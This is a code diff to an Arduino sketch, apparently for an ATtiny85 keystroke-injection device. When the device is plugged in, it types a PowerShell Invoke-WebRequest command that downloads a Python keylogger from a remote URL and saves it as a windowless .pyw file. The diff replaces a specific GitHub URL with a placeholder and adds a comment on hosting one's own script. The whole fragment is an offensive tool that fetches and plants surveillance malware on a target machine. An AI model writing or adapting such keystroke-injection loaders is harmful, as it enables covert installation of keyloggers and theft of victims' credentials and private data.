@@ -10,7 +10,8 @@ void setup() {
     delay(500);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     delay(500);
-    DigiKeyboard.print("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/Pranav-V-20/Remote_Keylogger_Using_Attiny85/refs/heads/main/keylogger.py\" | select -ExpandProperty Content | Out-File -append -encoding utf8 keylogger.pyw");
+    DigiKeyboard.print("Invoke-WebRequest -Uri \"Your-Script-URL\" | select -ExpandProperty Content | Out-File -append -encoding utf8 keylogger.pyw"); 
+    //Upload the python in github and a copy url from raw
     delay(500);
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     delay(1000);
